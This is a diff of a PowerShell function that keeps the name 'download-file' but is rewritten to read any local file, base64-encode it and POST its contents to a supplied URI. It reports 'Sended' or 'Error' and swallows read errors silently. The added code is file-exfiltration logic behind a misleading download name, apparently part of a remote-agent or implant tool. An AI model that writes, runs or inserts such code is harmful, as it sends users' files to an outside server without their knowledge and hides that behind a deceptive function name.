@@ -1,14 +1,32 @@
 function download-file {
-       param(
-            [Parameter(Mandatory)]
-            [string] $source,
-            [Parameter(Mandatory)]
-            [string] $destination
-        )
-    try{    
-    	Start-BitsTransfer -Source $source -Destination $destination
-     } catch {
-        printMessage -message "$_.Exception.Message" 
-     }
+    param (
+        [Parameter(Mandatory)]
+        [string] $source,
+        [Parameter(Mandatory)]
+        [string] $uri
+    )
 
+    $base64 = ''
+    
+    try 
+    {
+        $bytes = [System.IO.File]::ReadAllBytes($source)
+        $base64 = [Convert]::ToBase64String($bytes)
+    }
+    catch 
+    { }
+
+    if ($base64.Length -gt 0)
+    {
+        iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results=$base64}
+        iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results='Sended'}
+
+        return 'Done'
+    }
+    else
+    {
+        iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results='Error'}
+    }
+
+    return 'Source not found'
 }
